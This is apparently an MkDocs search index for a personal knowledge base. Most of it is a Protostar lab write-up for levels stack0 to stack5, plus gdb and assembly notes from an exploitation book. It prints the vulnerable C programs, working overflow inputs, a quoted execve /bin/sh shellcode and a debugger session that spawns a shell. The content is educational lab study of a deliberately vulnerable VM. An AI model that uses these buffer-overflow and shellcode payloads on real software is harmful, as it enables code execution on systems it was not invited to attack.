{"config":{"lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to the KnowledgeBase \u00b6 For full documentation visit mkdocs.org . Read here for more Extensions Todo \u00b6 Rebuild Server collect all photos and move them to dir pictures on the server check entry P2P Network sell old CPU on Kleinanzeigen Commands \u00b6 mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"Home"},{"location":"#welcome-to-the-knowledgebase","text":"For full documentation visit mkdocs.org . Read here for more Extensions","title":"Welcome to the KnowledgeBase"},{"location":"#todo","text":"Rebuild Server collect all photos and move them to dir pictures on the server check entry P2P Network sell old CPU on Kleinanzeigen","title":"Todo"},{"location":"#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs -h - Print help message and exit.","title":"Commands"},{"location":"Protostar/","text":"Protostart \u00b6 Protostar Website Offset Pattern stack0 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include <stdlib.h> #include <unistd.h> #include <stdio.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; modified = 0 ; gets ( buffer ); if ( modified != 0 ) { printf ( \"you have changed the 'modified' variable \\n \" ); } else { printf ( \"Try again? \\n \" ); } } Note This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution. This level is at /opt/protostar/bin/stack0 1 2 user@protostar:/opt/protostar/bin$ python -c 'print(\"A\"*65)' | ./stack0 you have changed the 'modified' variable Notes: * buffersize 64 bytes stack1 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; if ( argc == 1 ) { errx ( 1 , \"please specify an argument \\n \" ); } modified = 0 ; strcpy ( buffer , argv [ 1 ]); if ( modified == 0x61626364 ) { printf ( \"you have correctly got the variable to the right value \\n \" ); } else { printf ( \"Try again, you got 0x%08x \\n \" , modified ); } } This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory. This level is at /opt/protostar/bin/stack1 Hints: * If you are unfamiliar with the hexadecimal being displayed, \u201cman ascii\u201d is your friend. * Protostar is little endian 1 2 user@protostar:/opt/protostar/bin$ ./stack1 $(python -c 'print(\"A\"*64+\"\\x64\\x63\\x62\\x61\")') you have correctly got the variable to the right value Notes: * buffersize 64 bytes * we have to turn mix up bytes because of little endian stack2 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; char * variable ; variable = getenv ( \"GREENIE\" ); if ( variable == NULL ) { errx ( 1 , \"please set the GREENIE environment variable \\n \" ); } modified = 0 ; strcpy ( buffer , variable ); if ( modified == 0x0d0a0d0a ) { printf ( \"you have correctly modified the variable \\n \" ); } else { printf ( \"Try again, you got 0x%08x \\n \" , modified ); } } Stack2 looks at environment variables, and how they can be set. This level is at /opt/protostar/bin/stack2 1 2 user@protostar:/opt/protostar/bin$ declare -x GREENIE=$(python -c 'print(\"A\"*64+\"\\x0a\\x0d\\x0a\\x0d\")') ./stack2 Notes: * setting env stack3 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void win () { printf ( \"code flow successfully changed \\n \" ); } int main ( int argc , char ** argv ) { volatile int ( * fp )(); char buffer [ 64 ]; fp = 0 ; gets ( buffer ); if ( fp ) { printf ( \"calling function pointer, jumping to 0x%08x \\n \" , fp ); fp (); } } Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP) Hints * both gdb and objdump is your friend you determining where the win() function lies in memory. This level is at /opt/protostar/bin/stack3 1 2 3 4 5 6 user @protostar : / opt / protostar / bin $ objdump - d stack3 | grep win 08048424 < win > : #here is our adress user @protostar : / opt / protostar / bin $ python - c 'print(\"A\"*64+\"\\x24\\x84\\x04\\x08\")' | . / stack3 calling function pointer , jumping to 0x08048424 code flow successfully changed stack4 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void win () { printf ( \"code flow successfully changed \\n \" ); } int main ( int argc , char ** argv ) { char buffer [ 64 ]; gets ( buffer ); } Stack4 takes a look at overwriting saved EIP and standard buffer overflows. This level is at /opt/protostar/bin/stack4 Hints * A variety of introductory papers into buffer overflows may help. * gdb lets you do \u201crun < input\u201d * EIP is not directly after the end of buffer, compiler padding can also increase the size. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 user @protostar : / opt / protostar / bin $ objdump - d stack4 | grep win 080483 f4 < win > : ( gdb ) i f Stack level 0 , frame at 0xbffffd80 : eip = 0x804841d in main ( stack4 / stack4 . c : 16 ); saved eip 0xb7eadc76 source language c . Arglist at 0xbffffd78 , args : argc = 1 , argv = 0xbffffe24 Locals at 0xbffffd78 , Previous frame 's sp is 0xbffffd80 Saved registers: ebp at 0xbffffd78, eip at 0xbffffd7c (gdb) x/32x $esp 0xbffffd20: 0xbffffd30 0xb7ec6165 0xbffffd38 0xb7eada75 0xbffffd30: 0x41414141 0x42424242 0xbffffd00 0x080482e8 0xbffffd40: 0xb7ff1040 0x080495ec 0xbffffd78 0x08048449 0xbffffd50: 0xb7fd8304 0xb7fd7ff4 0x08048430 0xbffffd78 0xbffffd60: 0xb7ec6365 0xb7ff1040 0x0804843b 0xb7fd7ff4 0xbffffd70: 0x08048430 0x00000000 0xbffffdf8 0xb7eadc76 0xbffffd80: 0x00000001 0xbffffe24 0xbffffe2c 0xb7fe1848 0xbffffd90: 0xbffffde0 0xffffffff 0xb7ffeff4 0x0804824b user@protostar:/opt/protostar/bin$ python -c ' print ( \"A\" * 19 * 4 + \"\\xf4\\x83\\x04\\x08\" ) ' | . / stack4 code flow successfully changed Segmentation fault Notes: * find out adress of function win * find out adress of saved Stack Pointer * Offset: 19 Blocks each 4 Bytes * overwrite Return Pointer stack5 \u00b6 1 2 3 4 5 6 7 8 9 10 11 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { char buffer [ 64 ]; gets ( buffer ); } Stack5 is a standard buffer overflow, this time introducing shellcode. This level is at /opt/protostar/bin/stack5 Hints: * At this point in time, it might be easier to use someone elses shellcode * If debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debugger * remove the int3s once your shellcode is done. Shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ***************************************************** * Linux / x86 execve / bin / sh shellcode 23 bytes * ***************************************************** * Author: Hamza Megahed * ***************************************************** * Twitter: @ Hamza_Mega * ***************************************************** * blog: hamza-mega [ dot ] blogspot [ dot ] com * ***************************************************** * E-mail: hamza [ dot ] megahed [ at ] gmail [ dot ] com * ***************************************************** xor %eax , %eax push %eax push $0x68732f2f push $0x6e69622f mov %esp , %ebx push %eax push %ebx mov %esp , %ecx mov $0xb , %al int $0x80 ******************************** #include <stdio.h> #include <string.h> char * shellcode = \"\\ x31 \\ xc0 \\ x50 \\ x68 \\ x2f \\ x2f \\ x73 \\ x68 \\ x68 \\ x2f \\ x62 \\ x69 \" \"\\ x6e \\ x89 \\ xe3 \\ x50 \\ x53 \\ x89 \\ xe1 \\ xb0 \\ x0b \\ xcd \\ x80 \" ; int main ( void ) { fprintf ( stdout , \" Length : %d \\ n \" , strlen ( shellcode )) ; (*( void (*)()) shellcode )() ; return 0 ; } Payload: \\ x31 \\ xc0 \\ x50 \\ x68 \\ x2f \\ x2f \\ x73 \\ x68 \\ x68 \\ x2f \\ x62 \\ x69 \\ x6e \\ x89 \\ xe3 \\ x50 \\ x53 \\ x89 \\ xe1 \\ xb0 \\ x0b \\ xcd \\ x80 1 2 3 4 5 6 7 8 . / vuln $ ( python - c 'print \"\\x90\"*40 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"A\"*47 + \"\\x20\\xce\\xff\\xff\"' ) . / vuln $ ( python - c 'print \"\\x90\"*40 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"A\"*47 + \"\\x20\\xce\\xff\\xff\"' ) ( gdb ) shell python - c 'print \"\\x90\"*40 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"A\"*3 +\"B\"*4*2 + \"\\x20\\xce\\xff\\xff\"' > / home / user / input ( gdb ) run ( gdb ) shell python - c 'print \"\\x90\"*32 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"A\"*3 +\"B\"*4*4 + \"\\x90\\xf7\\xff\\xbf\"' > / home / user / input Notes: * Shellcode Explanation * Shellcode * \\x90 stands for nops in hex Scratch Notes \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 user @protostar : ~ $ python - c 'import struct; p = struct.pack(\">I\", 0x12345678); print(\" \\x42 \"*4 + p)' | hexdump - C 00000000 42 42 42 42 12 34 56 78 0 a | BBBB . 4 Vx .| 0000000 9 user @protostar : ~ $ python - c 'import struct; p = struct.pack(\">I\", 0x12345678); print(\" \\xCC \"*4 + p)' | hexdump - C 00000000 cc cc cc cc 12 34 56 78 0 a |..... 4 Vx .| 0000000 9 user @protostar : ~ $ python - c 'import struct; p = struct.pack(\"I\", 0x12345678); print(\" \\xCC \"*4 + p)' | hexdump - C 00000000 cc cc cc cc 78 56 34 12 0 a |.... xV4 ..| 0000000 9 user @protostar : ~ $ python - c 'import struct; p = struct.pack(\"<I\", 0x12345678); print(\" \\xCC \"*4 + p)' | hexdump - C 00000000 cc cc cc cc 78 56 34 12 0 a |.... xV4 ..| 0000000 9 user @protostar : ~ $ python - c 'import struct; p = struct.pack(\"I\", 0x12345678); print(\" \\xCC \"*4 + p)' | hexdump - C 00000000 cc cc cc cc 78 56 34 12 0 a |.... xV4 ..| 0000000 9 1 2 3 4 5 6 # program gets argument on runtime in gdb user @protostar : / opt / protostar / bin $ python - c 'print(\"A\"*64+\"BB\")' > / home / user / input ( gdb ) run $ ( cat / home / user / input ) # objdump basic usage objdump - d - M intel < binary > 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ( gdb ) shell python -c \"import struct; print '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80' + 'A' + 'B'*4*13 + struct.pack('I', 0xbffff770) \" > /home/user/input ( gdb ) run The program being debugged has been started already. Start it from the beginning? ( y or n ) y Starting program: /opt/protostar/bin/stack5 < /home/user/input Breakpoint 1 , 0x080483d4 in main ( argc = 1 , argv = 0xbffff864 ) at stack5/stack5.c:10 10 in stack5/stack5.c ( gdb ) x/32x $esp 0xbffff760: 0xbffff770 0xb7ec6165 0xbffff778 0xb7eada75 0xbffff770: 0xb7fd7ff4 0x0804958c 0xbffff788 0x080482c4 0xbffff780: 0xb7ff1040 0x0804958c 0xbffff7b8 0x08048409 0xbffff790: 0xb7fd8304 0xb7fd7ff4 0x080483f0 0xbffff7b8 0xbffff7a0: 0xb7ec6365 0xb7ff1040 0x080483fb 0xb7fd7ff4 0xbffff7b0: 0x080483f0 0x00000000 0xbffff838 0xb7eadc76 0xbffff7c0: 0x00000001 0xbffff864 0xbffff86c 0xb7fe1848 0xbffff7d0: 0xbffff820 0xffffffff 0xb7ffeff4 0x08048232 ( gdb ) c Continuing. Breakpoint 2 , main ( argc = 0 , argv = 0xbffff864 ) at stack5/stack5.c:11 11 in stack5/stack5.c ( gdb ) x/32x $esp 0xbffff760: 0xbffff770 0xb7ec6165 0xbffff778 0xb7eada75 0xbffff770: 0x6850c031 0x68732f2f 0x69622f68 0x50e3896e 0xbffff780: 0xb0e18953 0x4180cd0b 0x42424242 0x42424242 0xbffff790: 0x42424242 0x42424242 0x42424242 0x42424242 0xbffff7a0: 0x42424242 0x42424242 0x42424242 0x42424242 0xbffff7b0: 0x42424242 0x42424242 0x42424242 0xbffff770 0xbffff7c0: 0x00000000 0xbffff864 0xbffff86c 0xb7fe1848 0xbffff7d0: 0xbffff820 0xffffffff 0xb7ffeff4 0x08048232 ( gdb ) c Continuing. Executing new program: /bin/dash Error in re-setting breakpoint 1 : No symbol table is loaded. Use the \"file\" command. Error in re-setting breakpoint 2 : No symbol table is loaded. Use the \"file\" command. Error in re-setting breakpoint 1 : No symbol \"main\" in current context. Error in re-setting breakpoint 2 : No symbol \"main\" in current context. Error in re-setting breakpoint 1 : No symbol \"main\" in current context. Error in re-setting breakpoint 2 : No symbol \"main\" in current context. Program exited normally. ( gdb ) Python Foo \u00b6 1 2 3 4 5 6 7 8 9 10 11 $ python >>> import struct >>> >>> print struct . pack ( \">I\" , 0x41424344 ) # big endian Integer >I ABCD >>> print struct . pack ( \"<I\" , 0x41424344 ) # little endian Integer <I DCBA >>> print hex ( struct . unpack ( \">I\" , \"ABCD\" )[ 0 ]) # \"\\x41\\x42\\x43\\x44\" as big endian number 0x41424344 >>> print hex ( struct . unpack ( \"<I\" , \"ABCD\" )[ 0 ]) # interpret as little endian number 0x44434241","title":"Protostar"},{"location":"Protostar/#protostart","text":"Protostar Website Offset Pattern","title":"Protostart"},{"location":"Protostar/#stack0","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include <stdlib.h> #include <unistd.h> #include <stdio.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; modified = 0 ; gets ( buffer ); if ( modified != 0 ) { printf ( \"you have changed the 'modified' variable \\n \" ); } else { printf ( \"Try again? \\n \" ); } } Note This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution. This level is at /opt/protostar/bin/stack0 1 2 user@protostar:/opt/protostar/bin$ python -c 'print(\"A\"*65)' | ./stack0 you have changed the 'modified' variable Notes: * buffersize 64 bytes","title":"stack0"},{"location":"Protostar/#stack1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; if ( argc == 1 ) { errx ( 1 , \"please specify an argument \\n \" ); } modified = 0 ; strcpy ( buffer , argv [ 1 ]); if ( modified == 0x61626364 ) { printf ( \"you have correctly got the variable to the right value \\n \" ); } else { printf ( \"Try again, you got 0x%08x \\n \" , modified ); } } This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory. This level is at /opt/protostar/bin/stack1 Hints: * If you are unfamiliar with the hexadecimal being displayed, \u201cman ascii\u201d is your friend. * Protostar is little endian 1 2 user@protostar:/opt/protostar/bin$ ./stack1 $(python -c 'print(\"A\"*64+\"\\x64\\x63\\x62\\x61\")') you have correctly got the variable to the right value Notes: * buffersize 64 bytes * we have to turn mix up bytes because of little endian","title":"stack1"},{"location":"Protostar/#stack2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { volatile int modified ; char buffer [ 64 ]; char * variable ; variable = getenv ( \"GREENIE\" ); if ( variable == NULL ) { errx ( 1 , \"please set the GREENIE environment variable \\n \" ); } modified = 0 ; strcpy ( buffer , variable ); if ( modified == 0x0d0a0d0a ) { printf ( \"you have correctly modified the variable \\n \" ); } else { printf ( \"Try again, you got 0x%08x \\n \" , modified ); } } Stack2 looks at environment variables, and how they can be set. This level is at /opt/protostar/bin/stack2 1 2 user@protostar:/opt/protostar/bin$ declare -x GREENIE=$(python -c 'print(\"A\"*64+\"\\x0a\\x0d\\x0a\\x0d\")') ./stack2 Notes: * setting env","title":"stack2"},{"location":"Protostar/#stack3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void win () { printf ( \"code flow successfully changed \\n \" ); } int main ( int argc , char ** argv ) { volatile int ( * fp )(); char buffer [ 64 ]; fp = 0 ; gets ( buffer ); if ( fp ) { printf ( \"calling function pointer, jumping to 0x%08x \\n \" , fp ); fp (); } } Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP) Hints * both gdb and objdump is your friend you determining where the win() function lies in memory. This level is at /opt/protostar/bin/stack3 1 2 3 4 5 6 user @protostar : / opt / protostar / bin $ objdump - d stack3 | grep win 08048424 < win > : #here is our adress user @protostar : / opt / protostar / bin $ python - c 'print(\"A\"*64+\"\\x24\\x84\\x04\\x08\")' | . / stack3 calling function pointer , jumping to 0x08048424 code flow successfully changed","title":"stack3"},{"location":"Protostar/#stack4","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> void win () { printf ( \"code flow successfully changed \\n \" ); } int main ( int argc , char ** argv ) { char buffer [ 64 ]; gets ( buffer ); } Stack4 takes a look at overwriting saved EIP and standard buffer overflows. This level is at /opt/protostar/bin/stack4 Hints * A variety of introductory papers into buffer overflows may help. * gdb lets you do \u201crun < input\u201d * EIP is not directly after the end of buffer, compiler padding can also increase the size. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 user @protostar : / opt / protostar / bin $ objdump - d stack4 | grep win 080483 f4 < win > : ( gdb ) i f Stack level 0 , frame at 0xbffffd80 : eip = 0x804841d in main ( stack4 / stack4 . c : 16 ); saved eip 0xb7eadc76 source language c . Arglist at 0xbffffd78 , args : argc = 1 , argv = 0xbffffe24 Locals at 0xbffffd78 , Previous frame 's sp is 0xbffffd80 Saved registers: ebp at 0xbffffd78, eip at 0xbffffd7c (gdb) x/32x $esp 0xbffffd20: 0xbffffd30 0xb7ec6165 0xbffffd38 0xb7eada75 0xbffffd30: 0x41414141 0x42424242 0xbffffd00 0x080482e8 0xbffffd40: 0xb7ff1040 0x080495ec 0xbffffd78 0x08048449 0xbffffd50: 0xb7fd8304 0xb7fd7ff4 0x08048430 0xbffffd78 0xbffffd60: 0xb7ec6365 0xb7ff1040 0x0804843b 0xb7fd7ff4 0xbffffd70: 0x08048430 0x00000000 0xbffffdf8 0xb7eadc76 0xbffffd80: 0x00000001 0xbffffe24 0xbffffe2c 0xb7fe1848 0xbffffd90: 0xbffffde0 0xffffffff 0xb7ffeff4 0x0804824b user@protostar:/opt/protostar/bin$ python -c ' print ( \"A\" * 19 * 4 + \"\\xf4\\x83\\x04\\x08\" ) ' | . / stack4 code flow successfully changed Segmentation fault Notes: * find out adress of function win * find out adress of saved Stack Pointer * Offset: 19 Blocks each 4 Bytes * overwrite Return Pointer","title":"stack4"},{"location":"Protostar/#stack5","text":"1 2 3 4 5 6 7 8 9 10 11 #include <stdlib.h> #include <unistd.h> #include <stdio.h> #include <string.h> int main ( int argc , char ** argv ) { char buffer [ 64 ]; gets ( buffer ); } Stack5 is a standard buffer overflow, this time introducing shellcode. This level is at /opt/protostar/bin/stack5 Hints: * At this point in time, it might be easier to use someone elses shellcode * If debugging the shellcode, use \\xcc (int3) to stop the program executing and return to the debugger * remove the int3s once your shellcode is done. Shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ***************************************************** * Linux / x86 execve / bin / sh shellcode 23 bytes * ***************************************************** * Author: Hamza Megahed * ***************************************************** * Twitter: @ Hamza_Mega * ***************************************************** * blog: hamza-mega [ dot ] blogspot [ dot ] com * ***************************************************** * E-mail: hamza [ dot ] megahed [ at ] gmail [ dot ] com * ***************************************************** xor %eax , %eax push %eax push $0x68732f2f push $0x6e69622f mov %esp , %ebx push %eax push %ebx mov %esp , %ecx mov $0xb , %al int $0x80 ******************************** #include <stdio.h> #include <string.h> char * shellcode = \"\\ x31 \\ xc0 \\ x50 \\ x68 \\ x2f \\ x2f \\ x73 \\ x68 \\ x68 \\ x2f \\ x62 \\ x69 \" \"\\ x6e \\ x89 \\ xe3 \\ x50 \\ x53 \\ x89 \\ xe1 \\ xb0 \\ x0b \\ xcd \\ x80 \" ; int main ( void ) { fprintf ( stdout , \" Length : %d \\ n \" , strlen ( shellcode )) ; (*( void (*)()) shellcode )() ; return 0 ; } Payload: \\ x31 \\ xc0 \\ x50 \\ x68 \\ x2f \\ x2f \\ x73 \\ x68 \\ x68 \\ x2f \\ x62 \\ x69 \\ x6e \\ x89 \\ xe3 \\ x50 \\ x53 \\ x89 \\ xe1 \\ xb0 \\ x0b \\ xcd \\ x80 1 2 3 4 5 6 7 8 . / vuln $ ( python - c 'print \"\\x90\"*40 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"A\"*47 + \"\\x20\\xce\\xff\\xff\"' ) . / vuln $ ( python - c 'print \"\\x90\"*40 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"A\"*47 + \"\\x20\\xce\\xff\\xff\"' ) ( gdb ) shell python - c 'print \"\\x90\"*40 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"A\"*3 +\"B\"*4*2 + \"\\x20\\xce\\xff\\xff\"' > / home / user / input ( gdb ) run ( gdb ) shell python - c 'print \"\\x90\"*32 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"A\"*3 +\"B\"*4*4 + \"\\x90\\xf7\\xff\\xbf\"' > / home / user / input Notes: * Shellcode Explanation * Shellcode * \\x90 stands for nops in hex","title":"stack5"},{"location":"Protostar/#scratch-notes","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 user @protostar : ~ $ python - c 'import struct; p = struct.pack(\">I\", 0x12345678); print(\" \\x42 \"*4 + p)' | hexdump - C 00000000 42 42 42 42 12 34 56 78 0 a | BBBB . 4 Vx .| 0000000 9 user @protostar : ~ $ python - c 'import struct; p = struct.pack(\">I\", 0x12345678); print(\" \\xCC \"*4 + p)' | hexdump - C 00000000 cc cc cc cc 12 34 56 78 0 a |..... 4 Vx .| 0000000 9 user @protostar : ~ $ python - c 'import struct; p = struct.pack(\"I\", 0x12345678); print(\" \\xCC \"*4 + p)' | hexdump - C 00000000 cc cc cc cc 78 56 34 12 0 a |.... xV4 ..| 0000000 9 user @protostar : ~ $ python - c 'import struct; p = struct.pack(\"<I\", 0x12345678); print(\" \\xCC \"*4 + p)' | hexdump - C 00000000 cc cc cc cc 78 56 34 12 0 a |.... xV4 ..| 0000000 9 user @protostar : ~ $ python - c 'import struct; p = struct.pack(\"I\", 0x12345678); print(\" \\xCC \"*4 + p)' | hexdump - C 00000000 cc cc cc cc 78 56 34 12 0 a |.... xV4 ..| 0000000 9 1 2 3 4 5 6 # program gets argument on runtime in gdb user @protostar : / opt / protostar / bin $ python - c 'print(\"A\"*64+\"BB\")' > / home / user / input ( gdb ) run $ ( cat / home / user / input ) # objdump basic usage objdump - d - M intel < binary > 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ( gdb ) shell python -c \"import struct; print '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80' + 'A' + 'B'*4*13 + struct.pack('I', 0xbffff770) \" > /home/user/input ( gdb ) run The program being debugged has been started already. Start it from the beginning? ( y or n ) y Starting program: /opt/protostar/bin/stack5 < /home/user/input Breakpoint 1 , 0x080483d4 in main ( argc = 1 , argv = 0xbffff864 ) at stack5/stack5.c:10 10 in stack5/stack5.c ( gdb ) x/32x $esp 0xbffff760: 0xbffff770 0xb7ec6165 0xbffff778 0xb7eada75 0xbffff770: 0xb7fd7ff4 0x0804958c 0xbffff788 0x080482c4 0xbffff780: 0xb7ff1040 0x0804958c 0xbffff7b8 0x08048409 0xbffff790: 0xb7fd8304 0xb7fd7ff4 0x080483f0 0xbffff7b8 0xbffff7a0: 0xb7ec6365 0xb7ff1040 0x080483fb 0xb7fd7ff4 0xbffff7b0: 0x080483f0 0x00000000 0xbffff838 0xb7eadc76 0xbffff7c0: 0x00000001 0xbffff864 0xbffff86c 0xb7fe1848 0xbffff7d0: 0xbffff820 0xffffffff 0xb7ffeff4 0x08048232 ( gdb ) c Continuing. Breakpoint 2 , main ( argc = 0 , argv = 0xbffff864 ) at stack5/stack5.c:11 11 in stack5/stack5.c ( gdb ) x/32x $esp 0xbffff760: 0xbffff770 0xb7ec6165 0xbffff778 0xb7eada75 0xbffff770: 0x6850c031 0x68732f2f 0x69622f68 0x50e3896e 0xbffff780: 0xb0e18953 0x4180cd0b 0x42424242 0x42424242 0xbffff790: 0x42424242 0x42424242 0x42424242 0x42424242 0xbffff7a0: 0x42424242 0x42424242 0x42424242 0x42424242 0xbffff7b0: 0x42424242 0x42424242 0x42424242 0xbffff770 0xbffff7c0: 0x00000000 0xbffff864 0xbffff86c 0xb7fe1848 0xbffff7d0: 0xbffff820 0xffffffff 0xb7ffeff4 0x08048232 ( gdb ) c Continuing. Executing new program: /bin/dash Error in re-setting breakpoint 1 : No symbol table is loaded. Use the \"file\" command. Error in re-setting breakpoint 2 : No symbol table is loaded. Use the \"file\" command. Error in re-setting breakpoint 1 : No symbol \"main\" in current context. Error in re-setting breakpoint 2 : No symbol \"main\" in current context. Error in re-setting breakpoint 1 : No symbol \"main\" in current context. Error in re-setting breakpoint 2 : No symbol \"main\" in current context. Program exited normally. ( gdb )","title":"Scratch Notes"},{"location":"Protostar/#python-foo","text":"1 2 3 4 5 6 7 8 9 10 11 $ python >>> import struct >>> >>> print struct . pack ( \">I\" , 0x41424344 ) # big endian Integer >I ABCD >>> print struct . pack ( \"<I\" , 0x41424344 ) # little endian Integer <I DCBA >>> print hex ( struct . unpack ( \">I\" , \"ABCD\" )[ 0 ]) # \"\\x41\\x42\\x43\\x44\" as big endian number 0x41424344 >>> print hex ( struct . unpack ( \"<I\" , \"ABCD\" )[ 0 ]) # interpret as little endian number 0x44434241","title":"Python Foo"},{"location":"hacking/","text":"Terminology short/half word word 2-bytes double word DWORD 4-bytes 0x250 Getting your hands dirty 0x251 The bigger Picture objdump -M intel -D a.out|grep -A20 main.: disassembly of a.out -A20 20 lines after regex -M intel set flavor intel 0x252 The x86 Processor gdb -q a.out switch -q for quite (gdb) break main (gdb) run (gdb) info registers 32 Bit EAX Accumulator ECX Counter EDX Data EBX Base ESP Stack Pointer, 32 Bit address EBP Base Pointer, 32 Bit address ESI Source Index EDI Destination Index EIP Instruction Pointer (gdb) info registers 64 Bit RAX, RBX, RCX, ... //64 Bit address print $ebp - 4 print command for simple math nexti next instruction (gdb) quit 0x253 Assembly Language echo \"set disassembly-flavor intel\" > ~/.gdbinit set permantly disassembly flavor for gdb intel flavor: operation <destination>, <source> gcc -g <programm> compile with debug symbols GDB examine the memory x/3i $eip o Display in octal x Display in hexadecimal u Display in unsigned, standard base-10 decimal t Display in binary s Display as string i Display as instruction b,h,w,g behind the format to change unit size little-endian byte order = least significant byte first 0x260 Back to Basics 0x261 Strings libs: stdio.h string.h use safe libaries ~strcpy~ => strncpy 0x263 Pointers & address of operator * dereference operator reader@hacking:~/booksrc $ ./a.out int_ptr = 0xbffff834 &int_ptr = 0xbffff830 *int_ptr = 0x00000005 int_var is located at 0xbffff834 and contains 5 int_ptr is located at 0xbffff830, contains 0xbffff834, and points to 5 0x264 Format Strings %d Decimal %u Unsigned decimal %x Hexadecimal %s String %n number of written bytes so far %p Pointer short for 0x%08x 0x265 Typecasting (typecast_data_type) variable ```C int main(){ int a, b; float c, d; a = 13; b = 5; c = a 